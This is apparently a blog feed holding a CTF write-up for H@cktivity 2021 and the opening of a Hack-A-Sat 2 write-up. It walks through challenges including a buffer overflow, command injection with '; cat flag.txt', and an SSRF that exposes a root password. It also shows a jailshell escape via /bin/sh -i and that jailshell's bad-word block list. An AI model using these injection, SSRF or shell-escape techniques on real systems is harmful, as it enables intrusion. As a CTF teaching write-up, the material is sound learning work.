&lt;p&gt;&lt;img src=&quot;/assets/imgs/hacktivity2021/smasher_flag.png&quot; alt=&quot;OTP Smasher Flag&quot; title=&quot;OTP Smasher Page&quot; /&gt;&lt;/p&gt;

&lt;script type=&quot;text/x-mathjax-config&quot;&gt;
  MathJax.Hub.Config({
    extensions: [
      &quot;MathMenu.js&quot;,
      &quot;MathZoom.js&quot;,
      &quot;AssistiveMML.js&quot;,
      &quot;a11y/accessibility-menu.js&quot;
    ],
    jax: [&quot;input/TeX&quot;, &quot;output/CommonHTML&quot;],
    TeX: {
      extensions: [
        &quot;AMSmath.js&quot;,
        &quot;AMSsymbols.js&quot;,
        &quot;noErrors.js&quot;,
        &quot;noUndefined.js&quot;,
      ]
    }
  });
&lt;/script&gt;

&lt;script type=&quot;text/javascript&quot; async=&quot;&quot; src=&quot;https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML&quot;&gt;
&lt;/script&gt;</content><author><name></name></author><category term="CTF" /><category term="H@cktivity2021" /><category term="cryptography" /><category term="web_security" /><category term="programming" /><summary type="html">Had a lot of fun with this CTF and it’s always nice to see my amateur radio and infosec hobbies mixing together. Actually got around to doing a writeup this year too! I sometimes wonder if I should ever try joining a team for one of these, instead of always competing as a “solo” team. Maybe I’d do better than hovering around top 10% every time. Warmups Six Four Over Two (50 points) We are provided with a short text file containing the string: EBTGYYLHPNQTINLEGRSTOMDCMZRTIMBXGY2DKMJYGVSGIOJRGE2GMOLDGBSWM7IK. Based on the name of the challenge, this could potentially be a Base32-encoded string. (Because \(\frac{64}{2} = 32\)) We test our theory using CyberChef and immediately get the flag: flag{a45d4e70bfc407645185dd9114f9c0ef} Bass64 (50 points) We are provided with another text file, this time containing what appears to be a garbled mess of lines. However, simply disabling word wrap in Notepad allows us to see that it’s just ASCII word art for the string IGZsYWd7MzVhNWQxM2RhNmEyYWZhMGM2MmJmY2JkZDYzMDFhMGF9. Because it’s a relatively short string and I don’t know of anything that can convert from ASCII art back to text, we just manually parse and copy the text. 1 2 3 4 5 6 ___ ____ _____ __ ____ __ _ _____ __ __ __ ___ _ _ __ _____ __ __ ____ ____ _ _ _ _____ __ ____ ________ __ __ ____ __ __ ____ __ __ _ __ ______ _ _ ____ _______ __ __ __ ____ _____ _ __ __ ____ _____ ___ |_ _/ ___|__ /__\ \ / /\ \ / /_| |___ | \/ |___\ \ / / |__ | \ | |\ \ / / _ \ __ _| \/ |___ \| _ \| |__ | \ | |_ __ ___ | ____| _ \ \ / /\ \ / /__ / |__ | \/ |/ ___| \/ |___ \| \/ |_ __ ___ | | _ __ __\ \ / /___ \ | | | __|__ /| _ \ \ / /__| \/ | _ \| ___| |__ | \/ |/ ___| ___/ _ \ | | | _ / // __\ V / \ \ /\ / / _` | / /| |\/| |_ /\ \ / /| '_ \| \| | \ \ /\ / / | | |\ \/ / |\/| | __) | |_) | '_ \| \| | '_ ` _ \| _|| | | | \ V / \ \ /\ / / / /| '_ \| |\/| | | _| |\/| | __) | |\/| | '_ ` _ \ _ | || '_ ` _ \ V / __) | | | |/ / / / | | | \ V /_ / |\/| | | | | |_ | '_ \ | |\/| | | _| |_ | (_) | | | |_| |/ /_\__ \| | \ V V / (_| | / / | | | |/ / \ V / | | | | |\ | \ V V /| |_| | &amp;gt; &amp;lt;| | | |/ __/| _ &amp;lt;| | | | |\ | | | | | | |__| |_| | | | \ V V / / /_| | | | | | | |_| | | | |/ __/| | | | | | | | | |_| || | | | | | | / __/ |_| | &amp;lt; / /_ | |_| || | / /| | | | |_| | _| | | | || | | | |_| | _| \__, | |___\____/____|___/|_| \_/\_/ \__,_|/_/ |_| |_/___| \_/ |_| |_|_| \_| \_/\_/ \__\_\/_/\_\_| |_|_____|_| \_\_| |_|_| \_|_| |_| |_|_____\__, | |_| \_/\_/ /____|_| |_|_| |_|\____|_| |_|_____|_| |_|_| |_| |_|\___/ |_| |_| |_|_| |_____\___/|_|\_\/____ |____/ |_|/___|_| |_|____/|_| |_| |_||_| |_|\____|_| /_/ |___/ Based on both the challenge name and the format of the string, we can assume that this is a Base64-encoded string. Putting this into CyberChef gives us the flag: flag{35a5d13da6a2afa0c62bfcbdd6301a0a} Pimple (50 points) This one is pretty simple. Using file on attachment shows that it’s a GIMP file. Then after opening the file in GIMP and looking through the content, we find the flag printed on one of the inner layers: flag{9a64bc4a390cb0ce31452820ee562c3f} 1 2 $ file pimple pimple: GIMP XCF image data, version 011, 1024 x 1024, RGB Color Tsunami (50 points) Using file again, we discover that this is a .wav file. 1 2 $ file tsunami tsunami: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 44100 Hz The end of the audio is a series of tones that makes me think it’s spectrogram steganography. After finding a website that let’s us view the spectrogram of an audio file(Academo), we see that those series of tones make up the flag value: flag{f8fbb2c761821d3af23859f721cc140b}. If it’s hard to make out the flag yourself, just remember that all of the letters are lowercase so they can’t be confused with a number. Butter Overflow (50 points) This time we’re provided with three files. An executable file: butter_overflow The source code of the executable: source.c A Makefile we can use to compile the source code ourselves After examining the source code, we discover the following information about the program’s behavior: Line 43 - Creates a buffer array that can store up to 512 bytes Line 51 - Directly saves user input into this buffer, without size checks Lines 48 &amp;amp; 10 - Runs the give_flag() function if there’s a segmentation fault So the solution is simple, if we provide enough input to the program to cause a buffer overflow, it’ll trigger a segmentation fault and give us the flag. Sure enough, sending 600 A’s to the challenge server prints out the flag: flag{72d8784a5da3a8f56d2106c12dbab989} Oddball (103 points) Funnily enough, this warmup challenge ended up being worth more than some of the “real” challenges. Here, we are given an oddball file containing several lines of numbers. 1 2 3 4 5 6 7 8 0000000 067531 020165 067165 067543 062566 062562 020144 064164 0000020 020145 062563 071143 072145 066440 071545 060563 062547 0000040 035440 005051 072516 061155 071145 020163 067151 071040 0000060 067141 062547 030040 033455 020077 066510 066555 020041 0000100 067510 020167 062157 005041 063012 060554 075547 060462 0000120 031065 061462 033062 034143 060467 031546 034461 061062 0000140 031064 031543 063064 031544 033062 034063 061065 005175 0000160 After analyzing the file for a bit, we realize that there are no numbers greater than 7, so the file must be a list of octal numbers. As it turns out, the famous xxd tool has a lesser known uncle called od. But rather than hexdumps, this program creates octal dumps of files in the exact same format as the oddball file. Unfortunately, od doesn’t appear to have a reversal function like xxd does, so we have to make one ourselves. After taking out the first column of numbers, we can use the following python3 script to decode oddball. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * oct = &quot;&quot;&quot;067531 020165 067165 067543 062566 062562 020144 064164 020145 062563 071143 072145 066440 071545 060563 062547 035440 005051 072516 061155 071145 020163 067151 071040 067141 062547 030040 033455 020077 066510 066555 020041 067510 020167 062157 005041 063012 060554 075547 060462 031065 061462 033062 034143 060467 031546 034461 061062 031064 031543 063064 031544 033062 034063 061065 005175&quot;&quot;&quot;.split() for num in oct: # Decodes the octal string into its byte form # ^──────────────┐ # Reverses the endianess of the byte so it prints correctly # ^────┐ | # Decodes the byte into a printable string # ^────|─────────|───────┐ # V V V print(p16(int(num, 8)).decode('utf-8'), end='') Running this script provides us with the following output containing the flag: 1 2 3 4 You uncovered the secret message ;) Numbers in range 0-7? Hmmm! How od! flag{2a522c26c87af3192b42c34fd326385b} Web Confidentiality (50 points) This challenge involves a simple command injection vulnerability. We’re provided with a web application that gives us the ability to check the access control settings for any given file on the server. To start, we test it out with a known file, /etc/passwd. These results seem eerily similar to what ls -l does. It appears that the application is simply taking our input and appending it to an ls -l command. So if we wanted to see the files in our current directory, we could provide it with a period (.). Of course, we would normally just run ls -l on its own for the same effect, but the application rejects an empty input. This is the exact output we would expect from an ls -l . command. So our goal now is to output the contents of the flag.txt file within this directory. To verify our command injection capabilities, we can use the ; character to append a second command to this line. By sending a request for ; whoami, we predict that the server will run the command ls -l ; whoami, showing us the current directory and username. Success! This shows us that we have the ability to execute commands on the server. Now we just need to send a ; cat flag.txt request to output the flag, which ends up being: flag{e56abbce7b83d62dac05e59fb1e81c68} Bonus: If we wanted to, we can also see the source code for the application itself. A ; cat main.py request outputs the contents of main.py and shows how the application operates. And exactly how we predicted, the application is simply appending our input to the end of an ls -l command, without any verification or sanitization. Titanic (50 points) This challenge involves leveraging a server-side request forgery (SSRF) to access sensitive, internal information. The website contains two main features that we will use: an admin login page and a URL capturer service. The admin login is fairly normal. Since we obviously don’t have any admin credentials, we cannot make real use of this section right now. However, one thing of note about this page is the unique way it sends login attempts. Normally, logins would be sent as a POST request, with the username and password in the body. But here, the login attempt is made as a GET request, with the username and password in the URL. A username and password of test:test is performed with the URL http://challenge.ctf.games:31971/admin.php?uname=test&amp;amp;psw=test. While this behavior isn’t particularly useful to us right now, it will become very important later on. Moving on to the URL capturer service. This service simply takes the URL we provide, makes a request to that URL on our behalf, and gives back a screenshot of the webpage. This service can allow us to perform an SSRF to disclose sensitive, local information on the server. It’s actually difficult to really call it an SSRF vulnerability because it’s clearly intended behavior. But to first validate that we can use it for SSRF, we will make a request to http://localhost and verify that we receive the same webpage. The request is successful! We receive back the loading circle for the website, showing that it is successfully making a request to http://localhost. As far as how to use it though, the robots.txt file for the website points to the /server-status page as an option. When we make a request to that page ourselves, it gives back a 403 Forbidden error. However, if we ask the server to request it locally at http://localhost/server-status, we get back the full status page for this webserver. Remember how login attempts are made as a GET request? Because of that, now we can clearly see a username and password for a previously successful login attempt: root:EYNDR4NhadwX9rtef. Using these credentials, we can access the admin page and retrieve the flag: flag{88269d5ef52a5ee961ea6449e1b610a9}. Cryptography N1TP (50 Points) This challenge is deceptively simple. When we first connect to the server, “Nina” provides us with the ciphertext of the flag. We should also note that the ciphertext changes between connections. After this, they give us the option to provide our own plaintext to see the resulting ciphertext. While providing the ciphertext, Nina also confirms that we’re dealing with a one-time pad (OTP). Nina is correct in saying that OTPs are unbreakable. However, this is with the giant caveat that the OTP is used correctly. If you were to ever reuse a OTP’s key, like what Nina is doing here, it gives an attacker an opportunity to break the encryption. Even worse, if you reuse the key on plaintext that the attacker already knows, that OTP is completely broken. The reason for this is that a OTP uses the exclusive OR (XOR) operation to perform its encryption and decryption. Normal use of an XOR (\(\oplus\)) cipher goes like this: \[\textbf{Encryption: } \text{Plaintext} \oplus \text{Key} = \text{Ciphertext}\] \[\textbf{Decryption: } \text{Ciphertext} \oplus \text{Key} = \text{Plaintext}\] However, we if know the plaintext and ciphertext of a message, we can also compute the key using the properties of the XOR operation. \[\text{Plaintext} \oplus \text{Ciphertext} = \text{Key}\] So using this principle, we can perform a known-plaintext attack on Nina’s OTP to derive the key. Our first step is to encrypt a plaintext value the same length of the flag. For this, we will choose 00000000000000000000000000000000000000. After receiving back the ciphertext for this message, we can XOR the plaintext and ciphertext together to determine the OTP key using CyberChef. Finally, we can XOR the flag’s ciphertext and the key together to reveal the flag in plaintext: flag{9276cdb76a3dd6b1f523209cd9c0a11b}. Miscellanious Bad Words (50 points) This challenge generously gives us a bash shell on the server at the jump. The catch is that we’re placed into an extremely restrictive jailshell. If we attempt to use many of our common commands, such as ls, id, and whoami, the shell yells at us for using a “bad word”. Thankfully after testing several options, we finally have success with the command /bin/sh -i. This breaks us out of the jailshell and drops us into a non-restricted sh shell. A few ls commands reveals the path to the flag file in ~/just/out/of/reach/flag.txt, which we can cat to retrieve the flag: flag{2d43e30a358d3f30fe65cc47a9cbbe98}. If you want to know how the jailshell works, its code is contained within the .bashrc file. It defines a bad_words() function that compares each argument in a user’s commands against a list of “bad words”. Then using the trap 'bad_words' DEBUG command, it forces this function to run before any command is executed by the user. If one of the arguments matches one of the bad words, it stops the user’s command from running. However, we are able to get past it because it only checks for bad words starting from the beginning of the argument. This is because of the regex they’re using for matching (^$i.*). The ^ character anchors the match to only from the beginning of the string. So although sh is a bad word, /bin/sh goes undetected because the preceding /bin/ breaks the match. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 shopt -s extdebug function bad_words() { declare -a arr=(&quot;alert&quot; &quot;egrep&quot; &quot;fgrep&quot; &quot;grep&quot; &quot;l&quot; &quot;la&quot; &quot;ll&quot; &quot;ls&quot; [...snip...] &quot;less&quot; &quot;lessecho&quot; &quot;flag&quot; &quot;root&quot;) for i in &quot;${arr[@]}&quot; do if [[ &quot;$BASH_COMMAND&quot; =~ ^$i.* ]]; then echo &quot;You said a bad word, \&quot;$i\&quot;!!&quot; return 1; fi; done return; } trap 'bad_words' DEBUG OSINT Jed Sheeran (50 points) This challenge asks us to look for an aspiring music artist named Jed Sheeran. The actual discovery process is simple because a Google search for “Jed Sheeran” puts his SoundCloud as the first result. Jed’s profile has one song that contains a mess of beeps and squeaks. This sound is actually a Slow-Scan Television (SSTV) signal, a method to transmit images as an analog signal. SSTV is popular within the amateur radio community particularly because it’s a way to send and receive images using very little bandwidth. It’s also common to see this in augmented reality games (ARG) or easter eggs as a way to hide pictures, like here in Portal 2. So to retrieve the flag from this audio file, all we need to do is decode the SSTV signal it’s playing. One way to do it is to download an SSTV decoder app like Robot36 and hold your phone’s microphone up to your computer speakers. But you need to keep in mind that SSTV is an analog signal. So any noise in the signal will cause us to receive a degraded image. The more noise, the worse the image looks. However, we could use a something called a virtual audio cable, such as VB-CABLE, to connect our browser’s audio directly to an SSTV decoder program, like RX-SSTV. This will theoretically send the SSTV signal directly from SoundCloud to our decoder without any noise. Well… the flag is clearly there, but it’s extremely hard to decipher. A lot of things could be happening here. SoundCloud could be compressing the SSTV audio before it’s stored, causing additional distortion in our image. It could also be that the flag’s text is too small for this SSTV mode. SSTV isn’t exactly known for sending extremely clear images, even in a perfect world. So people normally use bigger text in an image to compensate for that or switch to a more “robust” SSTV mode. The Jed Sheeran signal appears to be using the Robot 36 mode and is about 36 seconds long. Compare this to the following SSTV image I picked up from the International Space Station that uses PD120 and is about 120 seconds long. It has text about the same size as the Jed Sheeran signal, but this time it’s actually intelligible. Keep in mind that I received this signal from space, as well. So where do we go from here? We could try really hard to determine what each character is. But, it seems that the challenge creator recognized how hard this was and decided to just put the flag in the song’s description: flag{59e56590445321ccefb4d91bba61f16c}. Scripting Words Church (407 points) It appears that people either don’t like scripting or just don’t know how to script because these challenges ended up being worth a lot of points. The description tells us we’ll have to solve 30 word searches, so let’s connect to the server and see what we’re dealing with. It looks fairly simple. We’re provided with a \(15 \times 15\) grid of characters and five words to find. The biggest challenge is really going to be how to parse everything. pwntools makes the sending and receiving part of the challenge easy, so all we have to worry about is how to process the information. The following python3 script let’s use receive the grid used for the game: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * io = remote('challenge.ctf.games', 32497) io.recvuntil('&amp;gt;') io.send('play') # Header lines io.recvlines(3) # Grid lines io.recvlines(16) # Trailing lines io.recvlines(2) After putting this into the python3 interpreter, we verify that we’re correctly aligned to process the grid. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 Python 3.9.2 (default, Feb 28 2021, 17:03:44) [GCC 10.2.1 20210110] on linux Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &amp;gt;&amp;gt;&amp;gt; from pwn import * &amp;gt;&amp;gt;&amp;gt; io = remote('challenge.ctf.games', 32497) ('&amp;gt;') io.send('play')[x] Opening connection to challenge.ctf.games on port 32497 [x] Opening connection to challenge.ctf.games on port 32497: Trying 34.122.187.139 [+] Opening connection to challenge.ctf.games on port 32497: Done &amp;gt;&amp;gt;&amp;gt; io.recvuntil('&amp;gt;') b&quot;Words Church v1.0\n\n Let's play a game of wordsearch! We will display the grid\n and offer you words to find. Please submit the locations of\n each word in the format [(X,Y), (X,Y), (X,Y), ...] for each letter.\n\n Please enter 'example' if you would like to see an \n example, or 'play' if you would like to get started.\n &amp;gt;&quot; &amp;gt;&amp;gt;&amp;gt; io.send('play') &amp;gt;&amp;gt;&amp;gt; &amp;gt;&amp;gt;&amp;gt; # Headers &amp;gt;&amp;gt;&amp;gt; io.recvlines(3) [b' Wordsearch # 1/30:', b'\t 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 : X', b'\t--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---'] &amp;gt;&amp;gt;&amp;gt; &amp;gt;&amp;gt;&amp;gt; # Grid lines &amp;gt;&amp;gt;&amp;gt; io.recvlines(16) [b' 0 | \t L P U C E U N K F C A Q T Q S H ', b' 1 | \t Q L Q Q K E S P U V A W X T M E ', b' 2 | \t E G O U H O U A Q D S K Z M T Y ', b' 3 | \t L Z S I F O S U J S S E N A O V ', b' 4 | \t I S M V D Y B B U G U O N J D J ', b' 5 | \t S J Q E T N L A V K R K Z W S I ', b' 6 | \t C P C R Y S E L K D E P S X A L ', b' 7 | \t Q Q T E W F Z L I M D E U S C O ', b' 8 | \t T G L D N N T Y J K I S Y L S B ', b' 9 | \t N E Q J I I X H S K B L K O H S ', b' 10 | \t V K M I U V U O K S K T Y E I T ', b' 11 | \t I M N F G V S O Z O S H R T T E ', b' 12 | \t H F Y K F S Q S Z J I I Z T J R ', b' 13 | \t H U X E T R Y N R Z J M Z S U S ', b' 14 | \t F R B D P Z K P K U N G A Q Y O ', b' 15 | \t M S O T B F R P F R R P M M Z T '] &amp;gt;&amp;gt;&amp;gt; &amp;gt;&amp;gt;&amp;gt; # Trailing lines &amp;gt;&amp;gt;&amp;gt; io.recvlines(2) [b' ---', b' Y '] Translating the grid into a 2D-array is fairly trivial. All we have to do is split each line on whitespace to get a list of all characters, and then skip the first two characters that contain the Y coordinate and | separator. The following code does this for us: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # Process grid lines for _ in range(16): # Decode the input from a bytestring into a normal string # ^─────────────────────────┐ # Split the string on whitespace, returning a list of each # ^ character in the string # └─────────────────────────│───────────────┐ # Skip the first two characters in the new list # ^─────────────────────────│───────────────│──────┐ grid.append( io.recvline().decode('utf-8').split()[2:] ) # Test grid print(grid) # Output &quot;&quot;&quot; [['L', 'P', 'U', 'C', 'E', 'U', 'N', 'K', 'F', 'C', 'A', 'Q', 'T', 'Q', 'S', 'H'], ['Q', 'L', 'Q', 'Q', 'K', 'E', 'S', 'P', 'U', 'V', 'A', 'W', 'X', 'T', 'M', 'E'], ['E', 'G', 'O', 'U', 'H', 'O', 'U', 'A', 'Q', 'D', 'S', 'K', 'Z', 'M', 'T', 'Y'], ['L', 'Z', 'S', 'I', 'F', 'O', 'S', 'U', 'J', 'S', 'S', 'E', 'N', 'A', 'O', 'V'], ['I', 'S', 'M', 'V', 'D', 'Y', 'B', 'B', 'U', 'G', 'U', 'O', 'N', 'J', 'D', 'J'], ['S', 'J', 'Q', 'E', 'T', 'N', 'L', 'A', 'V', 'K', 'R', 'K', 'Z', 'W', 'S', 'I'], ['C', 'P', 'C', 'R', 'Y', 'S', 'E', 'L', 'K', 'D', 'E', 'P', 'S', 'X', 'A', 'L'], ['Q', 'Q', 'T', 'E', 'W', 'F', 'Z', 'L', 'I', 'M', 'D', 'E', 'U', 'S', 'C', 'O'], ['T', 'G', 'L', 'D', 'N', 'N', 'T', 'Y', 'J', 'K', 'I', 'S', 'Y', 'L', 'S', 'B'], ['N', 'E', 'Q', 'J', 'I', 'I', 'X', 'H', 'S', 'K', 'B', 'L', 'K', 'O', 'H', 'S'], ['V', 'K', 'M', 'I', 'U', 'V', 'U', 'O', 'K', 'S', 'K', 'T', 'Y', 'E', 'I', 'T'], ['I', 'M', 'N', 'F', 'G', 'V', 'S', 'O', 'Z', 'O', 'S', 'H', 'R', 'T', 'T', 'E'], ['H', 'F', 'Y', 'K', 'F', 'S', 'Q', 'S', 'Z', 'J', 'I', 'I', 'Z', 'T', 'J', 'R'], ['H', 'U', 'X', 'E', 'T', 'R', 'Y', 'N', 'R', 'Z', 'J', 'M', 'Z', 'S', 'U', 'S'], ['F', 'R', 'B', 'D', 'P', 'Z', 'K', 'P', 'K', 'U', 'N', 'G', 'A', 'Q', 'Y', 'O'], ['M', 'S', 'O', 'T', 'B', 'F', 'R', 'P', 'F', 'R', 'R', 'P', 'M', 'M', 'Z', 'T']] &quot;&quot;&quot; The next step is to determine how to receive the words we need to search for. After we receive the grid lines, the questions are sent to us in the following format: LIEU: &amp;gt; . All we need to do here is extract the word, which is very easy to do using split() again. 1 2 3 4 # Receive input until we hit the '&amp;gt;' character question = io.recvuntil('&amp;gt;').decode('utf-8') # Split the line on the ':' character and take everything before the ':' word = question.split(':')[0].strip() Now that we have our grid and words in a format we can process, it’s time to create the searching functions. While I’m sure there are super fast algorithms specifically designed to solve this problem, we’re going to stick with the naïve solution: go through every coordinate that matches the first letter of the word and search out from all eight directions to see if the rest of it matches. Here we have two components to design, the function to search through the entire grid, and the function to search out from a position to determine if the word matches. I’ve implemented them both in python3, as seen below: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 # Search from a given (x,y) position out a given direction # and return the positions of matching characters. # Returns an empty list `[]` if the match fails. def direction_search(word, grid, x, y, x_delta, y_delta): tiles = [] for c in word: # If this tile doesn't match the current character, # return an empty list. # The position also wraps around the edges of the grid. if grid[y % len(grid)][x % len(grid)] != c: return [] else: # If we're still matching, add this position as an # (x, y) tuple to the position list. tiles.append( (x, y) ) # Move in the given direction y += y_delta x += x_delta return tiles # Search each tile in the grid and determine if the word is found # in any 8 directions from each tile. # Returns list of positions if the word is found, empty list `[]`, # if not. def word_search(word, grid): for (y, row) in enumerate(grid): for (x, tile) in enumerate(row): # If this tile matches the first letter of the word, then # check if the rest of the word is found in any of the # 8 directions from this position. if tile == word[0]: for x_delta in [-1, 0, 1]: for y_delta in [-1, 0, 1]: search = direction_search(word, x, y, grid, x_delta, y_delta) if len(search) &amp;gt; 0: return search return [] Finally, we can combine all of these elements in the final script and run it to solve the challenge to receive the flag: flag{ac670e1f34da9eb748b3f241eb03f51b}. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 #!/usr/bin/python3 from pwn import * import sys def direction_search(word, grid, x, y, x_delta, y_delta): tiles = [] for c in word: if grid[y % len(grid)][x % len(grid)] != c: return [] else: tiles.append( (x, y) ) y += y_delta x += x_delta return tiles def word_search(word, grid): for (y, row) in enumerate(grid): for (x, tile) in enumerate(row): if tile == word[0]: for x_delta in [-1, 0, 1]: for y_delta in [-1, 0, 1]: search = direction_search(word, grid, x, y, x_delta, y_delta) if len(search) &amp;gt; 0: return search return [] def main(): # Connect to the challenge server port = int(sys.argv[1]) io = remote('challenge.ctf.games', port) # Start a game io.recvuntil('&amp;gt;') io.send('play') for _ in range(30): # Skip header lines print(io.recvline().decode('utf-8').strip()) io.recvlines(2) # Process grid grid = [] for _ in range(16): grid.append( io.recvline().decode('utf-8').split()[2:] ) # Skip trailing lines io.recvlines(2) # Answer questions for _ in range(5): question = io.recvuntil('&amp;gt;').decode('utf-8') word = question.split(':')[0].strip() answer = word_search(word, grid) io.sendline( str(answer).encode('utf-8') ) # Skip post-game lines io.recvlines(3) # Print the final output print(io.recvrepeat(5).decode('utf-8')) if __name__ == &quot;__main__&quot;: main() OTP Smasher (283 points) This is a pretty interesting challenge because it requires us to do some optical character recognition (OCR). We’re presented with a simple webpage displaying a picture of numbers, an submission field, and a counter in the upper-left. Chrome DevTools also shows that the page also attempts to display the image static/flag.png. Based on the challenge’s name, the number picture might be intended to act as a one-time password (OTP). Submitting the OTP increments the upper-left counter by one and waiting too long to submit another OTP resets it to zero. While this challenge was up, the creator eventually decided to increase the length of time allowed until a reset to help make the challenge a bit easier. So right now, we could technically manually submit 45 passwords to get the flag. But of course, that is no fun learning-wise and no fun because it’s super tedious. Using Chrome DevTools, we were able to figure out the format of the submission: a POST request to the main page with the password in a field called otp_entry. Using this information, we are now able to automate OTP submissions. 1 2 3 4 5 6 7 8 import requests from bs4 import BeautifulSoup as bs # Send the current `otp` to the server post = requests.post(f&quot;http://challenge.ctf.games:{port}/&quot;, data={&quot;otp_entry&quot;:otp}) # Print out the current counter value print( bs(post.text, 'html.parser').p ) The remaining problem is how to know what numbers to send? To accomplish this, we will make use of a software called Tesseract and its companion Python module, pytesseract. Combining this with the requests module to download the image and the PIL module to store the image, we can now automate OCR on the images to determine the OTP’s numbers. 1 2 3 4 5 6 7 8 9 10 11 12 13 import requests import pytesseract from PIL import Image from io import BytesIO # Retrieve the current OTP image get = requests.get(f&quot;http://challenge.ctf.games:{port}/static/otp.png&quot;) # Save the image into a PIL Image object image = Image.open(BytesIO(get.content)) # OCR the image to determine the OTP otp = pytesseract.image_to_string(image).strip() This gives us an 80% solution to the challenge. I say 80% because while it works most of the time, it fails enough that we have to manually step in every once in awhile. There’s probably a way to train tesseract to better recognize the OTP numbers, but we won’t dive into that realm for this challenge. For now, we’ll just check if the string from tesseract is a number. If it isn’t, then have the user type in the OTP manually. 1 2 3 4 5 6 # See if we get an error when converting the OTP to a number try: int(otp) except: # If the OTP isn't a number, make the user type it in manually otp = input(&quot;&amp;gt;&quot;) Now that all of our components are created, we can combine them into the final script that’ll automatically send the OTPs to the server until it sees the flag: flag{f994cd9c756675b743b10c44b32e36b6}. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 import requests import pytesseract import sys from PIL import Image from io import BytesIO from bs4 import BeautifulSoup as bs port = int(sys.argv[1]) while True: # Retrieve the current OTP image get = requests.get(f&quot;http://challenge.ctf.games:{port}/static/otp.png&quot;) # Save the image into a PIL Image object image = Image.open(BytesIO(get.content)) # OCR the image to determine the OTP otp = pytesseract.image_to_string(image).strip() print(f&quot;OTP - {otp}&quot;) # See if we get an error when converting the OTP to a number try: int(otp) except: # If the OTP isn't a number, make the user type it in manually otp = input(&quot;&amp;gt;&quot;) # Send the current `otp` to the server post = requests.post(f&quot;http://challenge.ctf.games:{port}/&quot;, data={&quot;otp_entry&quot;:otp}) # Print out the current counter value print( bs(post.text, 'html.parser').p ) # Check if the flag image is available yet flag = requests.get(f&quot;http://challenge.ctf.games:{port}/static/flag.png&quot;) if flag.status_code != 404: # If we find the flag, save it and end the script print(&quot;Flag found&quot;) with open(&quot;flag.png&quot;, &quot;wb&quot;) as f: f.write(flag.content) exit()</summary></entry><entry><title type="html">Hack-A-Sat 2: tree in the forest</title><link href="https://bernardsmith0892.github.io/posts/hackasat2-forest/" rel="alternate" type="text/html" title="Hack-A-Sat 2: tree in the forest" /><published>2021-06-29T22:00:00-10:00</published><updated>2021-06-29T22:00:00-10:00</updated><id>https://bernardsmith0892.github.io/posts/hackasat2-forest</id><content type="html" xml:base="https://bernardsmith0892.github.io/posts/hackasat2-forest/">&lt;h1 id=&quot;tree-in-the-forest-rapid-unplanned-disassembly&quot;&gt;tree in the forest (Rapid Unplanned Disassembly)&lt;/h1&gt;

&lt;p&gt;Upon connecting to the challenge and providing our ticket, we’re presented with a simple message.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Starting up Service on udp:18.222.149.188:12752
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can connect to this server using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -u 18.222.149.188 12752&lt;/code&gt; and see what the challenge looks like. After experimenting with a bit of random input, we can quickly see that the server is expecting &lt;em&gt;8 bytes&lt;/em&gt; of input.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;$ nc -u 18.222.149.188 12752
555555
Invalid length of command header, expected 8 but got 7
5555555
Command header acknowledge: version:13621 type:13621 id:171259189
Invalid id:171259189
55555555
Command header acknowledge: version:13621 type:13621 id:892679477
Invalid id:892679477
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The challenge page provides us with the source code (&lt;a href=&quot;https://bernardsmith0892.github.io/assets/files/parser.c&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parser.c&lt;/code&gt;&lt;/a&gt;) for this server, which easily illuminates what’s going on. The server is expecting us to provide a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;command_header&lt;/code&gt; struct composed of three values:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A 16-bit integer for the version of the command. Not used within the program.&lt;/li&gt;
